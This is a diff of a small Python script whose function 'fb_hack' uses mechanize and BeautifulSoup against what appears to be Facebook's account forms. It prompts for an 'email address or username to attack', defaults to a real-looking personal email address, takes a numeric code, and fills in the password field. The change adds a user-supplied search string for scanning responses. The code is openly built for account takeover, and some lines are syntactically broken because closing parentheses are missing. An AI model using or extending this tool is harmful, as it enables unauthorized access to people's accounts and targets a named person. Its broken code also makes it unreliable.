@@ -57,7 +57,7 @@ def sleepy(counter):
       print(x, end='\r')
     sleep(1)
 
-def fb_hack(email, codex):
+def fb_hack(email, codex, search):
   soup = BeautifulSoup()
   browser = mechanize.Browser()
   browser.set_handle_robots(False)
@@ -80,7 +80,7 @@ def fb_hack(email, codex):
     file.write(str(soup))
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
-  print(soup.find_all(string=re.compile("Try"))
+  print(soup.find_all(string=re.compile(search))
   browser.select_form(nr=0)
   browser.form['pass'] = str(1)
 os.system('clear')
@@ -88,4 +88,5 @@ passcode6()
 
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 99999999)
-fb_hack(ehack, reset)
+sear = str(input('Search:')
+fb_hack(ehack, reset, sear)
